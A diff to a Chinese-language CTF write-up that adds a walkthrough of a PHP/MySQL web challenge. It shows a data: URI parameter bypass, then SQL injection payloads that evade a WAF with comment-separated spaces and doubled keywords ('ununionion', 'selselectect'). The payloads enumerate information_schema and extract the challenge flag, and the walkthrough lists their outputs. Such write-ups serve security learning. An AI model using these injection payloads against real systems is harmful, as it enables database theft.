@@ -146,9 +146,31 @@
         3. `strlen($b)>5`
         4. `eregi("111".substr($b,0,1),"1114")`
         5. `substr($b,0,1)!=4`
-    - 所以构造出可以获得flag的连接：`index.php?id=0a&a=data:text/plain,1112%20is%20a%20nice%20lab!&b=.whaterever`，获得
-    - [PHP中的header函数](http://www.cnblogs.com/fengzheng126/archive/2012/04/21/2461475.html)
-    -
+    - 所以构造出可以获得flag的连接：`index.php?id=0a&a=data:text/plain,1112%20is%20a%20nice%20lab!&b=.whaterever`，获得页面`﻿Come ON!!! {/^HT2mCpcvOLf}`。
+    - 查看新的地址`^HT2mCpcvOLf/index.php?id=1`，页面内容为`hi666`，测试GET参数`id`，发现有注入点和WAF。
+    - 进行注入尝试：
+        - 检查WAF
+            - `?id='--` 得到 `SELECT * FROM content WHERE id='--`
+            - `?id=0` 会跳转到 `?id=1`，判断为0条件不成立
+            - `?id='%20--` 得到 `you bad boy/girl!`，对空格有过滤，采用注释符`/*s*/`达到分割的目的。
+            - `?id=0/*s*/union/*s*/select/*s*/1,2,3/*s*/from/*s*/dual`，同样会被墙
+        - 数据库信息搜集
+            - 判定页面内容位置：`?id=0/*s*/ununionion/*s*/selselectect/*s*/1,2,3/*s*/frofromm/*s*/dual`，得到`3`
+            - 判定数据库版本：`?id=0/*s*/ununionion/*s*/selselectect/*s*/1,2,version()/*s*/frofromm/*s*/dual`，得到`5.6.24`，判定为MySQL
+            - 判定当前库名：`?id=0/*s*/ununionion/*s*/selselectect/*s*/1,2,database()/*s*/frofromm/*s*/dual`，得到`test`
+            - 获得所有表名： `?id=0/*s*/ununionion/*s*/selselectect/*s*/1,2,group_concat(table_name)/*s*/frofromm/*s*/information_schema.tables/*s*/where/*s*/version=10`，得到`CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TAB`
+            - 获得`test`下表名：`?id=0/*s*/ununionion/*s*/selselectect/*s*/1,2,group_concat(table_name)/*s*/frofromm/*s*/information_schema.tables/*s*/where/*s*/table_schema=0x74657374`，得到`content`
+                - `0x74657374`为test十六进制编码
+            - 获得`content`下列名：`?id=0/*s*/ununionion/*s*/selselectect/*s*/1,2,group_concat(column_name)/*s*/frofromm/*s*/information_schema.columns/*s*/where/*s*/table_schema=0x74657374`，得到`id,context,title`，所以我们之前能看到的`hi666`是`title`
+        - 取得flag：`?id=0/*s*/ununionion/*s*/selselectect/*s*/1,2,context/*s*/frofromm/*s*/test.content`
+            - `PCTF{Fin4lly_U_got_i7_C0ngRatulation5}`
+    - Ref
+        - [PHP中的header函数](http://www.cnblogs.com/fengzheng126/archive/2012/04/21/2461475.html)
+        - [MySql注入科普](http://drops.wooyun.org/tips/123)
+        - [MySQL注入技巧](http://drops.wooyun.org/tips/7299)
+        - [MYSQL注入语句大全](http://www.2cto.com/Article/201108/99744.html)
 
 6. RE?
     - so文件
+
+7. flag在管理员手里
